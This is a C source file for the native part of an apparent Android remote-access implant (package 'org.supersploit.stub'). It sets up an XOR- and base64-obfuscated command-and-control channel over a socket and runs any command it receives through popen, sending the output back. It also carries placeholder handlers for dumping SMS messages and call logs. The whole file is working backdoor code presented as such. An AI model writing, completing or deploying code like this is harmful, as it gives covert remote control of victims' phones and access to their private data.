#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <jni.h>

// --- JNI GLOBALS ---
static JavaVM* g_vm = NULL;
static jobject g_context = NULL;

// --- C2 COMMUNICATION ---
int comm_sock = -1;

// Struct to hold arguments for the C2 thread
typedef struct {
    int fd;
    char* key;
} c2_args_t;

// Base64 implementation
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* b64_encode(const unsigned char *data, size_t input_length, size_t *out_len) {
    *out_len = 4 * ((input_length + 2) / 3);
    char *encoded_data = malloc(*out_len + 1);
    if (encoded_data == NULL) return NULL;
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        encoded_data[j++] = b64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 0 * 6) & 0x3F];
    }
    for (size_t i = 0; i < (3 - input_length % 3) % 3; i++) encoded_data[*out_len - 1 - i] = '=';
    encoded_data[*out_len] = '\0';
    return encoded_data;
}

unsigned char* b64_decode(const char *data, size_t input_length, size_t *out_len) {
    if (input_length % 4 != 0) return NULL;
    *out_len = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*out_len)--;
    if (data[input_length - 2] == '=') (*out_len)--;
    unsigned char *decoded_data = malloc(*out_len + 1);
    if (decoded_data == NULL) return NULL;
    int build_table[256];
    for (int i = 0; i < 256; i++) build_table[i] = 0;
    for (int i = 0; i < 64; i++) build_table[(unsigned char)b64_table[i]] = i;
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : build_table[(unsigned char)data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : build_table[(unsigned char)data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : build_table[(unsigned char)data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : build_table[(unsigned char)data[i++]];
        uint32_t triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6);
        if (j < *out_len) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *out_len) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *out_len) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }
    decoded_data[*out_len] = '\0';
    return decoded_data;
}

void xor_crypt(char *data, size_t len, const char* key) {
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % strlen(key)];
}

int send_enc(const char* data, size_t len, const char* key) {
    if (comm_sock < 0) return -1;
    char* xord_data = (char*)malloc(len);
    if (!xord_data) return -1;
    memcpy(xord_data, data, len);
    xor_crypt(xord_data, len, key);

    size_t b64_len = 0;
    char* b64_data = b64_encode((unsigned char*)xord_data, len, &b64_len);
    free(xord_data);
    if (!b64_data) return -1;

    uint32_t net_len = htonl(b64_len);
    if (send(comm_sock, &net_len, sizeof(net_len), 0) < 0) {
        free(b64_data);
        return -1;
    }
    if (send(comm_sock, b64_data, b64_len, 0) < 0) {
        free(b64_data);
        return -1;
    }
    free(b64_data);
    return 0;
}

char* recv_enc(const char* key) {
    if (comm_sock < 0) return NULL;
    uint32_t net_len;
    if (recv(comm_sock, &net_len, sizeof(net_len), 0) <= 0) return NULL;

    size_t b64_len = ntohl(net_len);
    if (b64_len > 8192 || b64_len == 0) return NULL;

    char* b64_buffer = malloc(b64_len + 1);
    size_t total_read = 0;
    while(total_read < b64_len) {
        ssize_t bytes_read = recv(comm_sock, b64_buffer + total_read, b64_len - total_read, 0);
        if (bytes_read <= 0) {
            free(b64_buffer);
            return NULL;
        }
        total_read += bytes_read;
    }
    b64_buffer[b64_len] = '\0';

    size_t dec_len = 0;
    unsigned char* dec_data = b64_decode(b64_buffer, b64_len, &dec_len);
    free(b64_buffer);
    if (!dec_data) return NULL;

    xor_crypt((char*)dec_data, dec_len, key);
    char* final_str = malloc(dec_len + 1);
    memcpy(final_str, dec_data, dec_len);
    final_str[dec_len] = '\0';
    free(dec_data);

    return final_str;
}

// --- COMMAND HANDLERS ---
void handle_command(const char* cmd, const char* key) {
    if (strncmp(cmd, "dump_sms", 8) == 0) {
        send_enc("SMS Dump (Not Implemented)", 26, key);
    } else if (strncmp(cmd, "dump_calls", 10) == 0) {
        send_enc("Call Log Dump (Not Implemented)", 31, key);
    } else if (strncmp(cmd, "cd ", 3) == 0) {
        if (chdir(cmd + 3) == 0) {
            send_enc("\n", 1, key);
        } else {
            send_enc("cd failed", 9, key);
        }
    } else if (strcmp(cmd, "pwd") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            send_enc(cwd, strlen(cwd), key);
        } else {
            send_enc("pwd failed", 10, key);
        }
    } else {
        FILE* fp = popen(cmd, "r");
        if (!fp) {
            send_enc("Failed to execute", 17, key);
            return;
        }
        char buffer[1024];
        size_t n;
        while ((n = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
            buffer[n] = '\0';
            send_enc(buffer, n, key);
        }
        pclose(fp);
    }
}

// --- MAIN C2 LOOP ---
void* c2_loop(void* args) {
    c2_args_t* c2_args = (c2_args_t*)args;
    comm_sock = c2_args->fd;
    const char* key = c2_args->key;

    send_enc("Native C DRS Session Active", 27, key);

    while (1) {
        char* cmd = recv_enc(key);
        if (!cmd) break;
        handle_command(cmd, key);
        free(cmd);
    }
    close(comm_sock);
    comm_sock = -1;
    free(c2_args->key);
    free(c2_args);
    return NULL;
}

// --- JNI ENTRY POINT ---
JNIEXPORT void JNICALL Java_org_supersploit_stub_PayloadService_startNativeC2(JNIEnv* env, jobject thiz, jint fd) {
    jclass context_class = (*env)->FindClass(env, "android/content/Context");
    jmethodID get_resources_mid = (*env)->GetMethodID(env, context_class, "getResources", "()Landroid/content/res/Resources;");
    jobject resources_obj = (*env)->CallObjectMethod(env, thiz, get_resources_mid);

    jclass resources_class = (*env)->GetObjectClass(env, resources_obj);
    jmethodID get_identifier_mid = (*env)->GetMethodID(env, resources_class, "getIdentifier", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I");

    jstring key_name = (*env)->NewStringUTF(env, "xor_key");
    jstring type_name = (*env)->NewStringUTF(env, "string");
    jstring package_name = (*env)->NewStringUTF(env, "org.supersploit.stub");
    jint key_id = (*env)->CallIntMethod(env, resources_obj, get_identifier_mid, key_name, type_name, package_name);

    jmethodID get_string_mid = (*env)->GetMethodID(env, resources_class, "getString", "(I)Ljava/lang/String;");
    jstring xor_key_jstring = (jstring)(*env)->CallObjectMethod(env, resources_obj, get_string_mid, key_id);
    const char* xor_key_chars = (*env)->GetStringUTFChars(env, xor_key_jstring, 0);

    c2_args_t* args = malloc(sizeof(c2_args_t));
    args->fd = fd;
    args->key = strdup(xor_key_chars);
    (*env)->ReleaseStringUTFChars(env, xor_key_jstring, xor_key_chars);

    pthread_t c2_thread;
    pthread_create(&c2_thread, NULL, c2_loop, args);
}
